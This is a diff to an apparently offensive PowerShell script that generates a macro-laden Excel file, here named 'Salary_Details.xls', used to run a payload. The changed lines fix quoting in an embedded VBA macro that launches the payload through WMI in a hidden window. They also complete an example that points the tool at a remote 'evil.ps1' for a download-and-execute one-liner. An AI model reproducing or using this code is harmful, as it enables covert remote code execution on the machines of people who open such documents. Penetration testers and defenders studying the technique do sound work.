@@ -51,7 +51,7 @@ Use above when you want to use the default payload, which is a powershell downlo
 named "Salary_Details.xls" would be generated in user's temp directory.
 
 .EXAMPLE
-PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments Evil
 
 Use above when you want to use the default payload, which is a powershell download and execute one-liner.
 The Arugment parameter allows to pass arguments to the downloaded script.
@@ -164,7 +164,7 @@ https://github.com/samratashok/nishang
             Set objConfig = objStartup.SpawnInstance_
             objConfig.ShowWindow = HIDDEN_WINDOW
             Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-            objProcess.Create '$Payload', Null, objConfig, intProcessID
+            objProcess.Create "$Payload", Null, objConfig, intProcessID
          End Function
 "@
 
@@ -184,7 +184,7 @@ https://github.com/samratashok/nishang
             Set objConfig = objStartup.SpawnInstance_
             objConfig.ShowWindow = HIDDEN_WINDOW
             Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-            objProcess.Create '$Payload', Null, objConfig, intProcessID
+            objProcess.Create "$Payload", Null, objConfig, intProcessID
          End Function
 "@
 
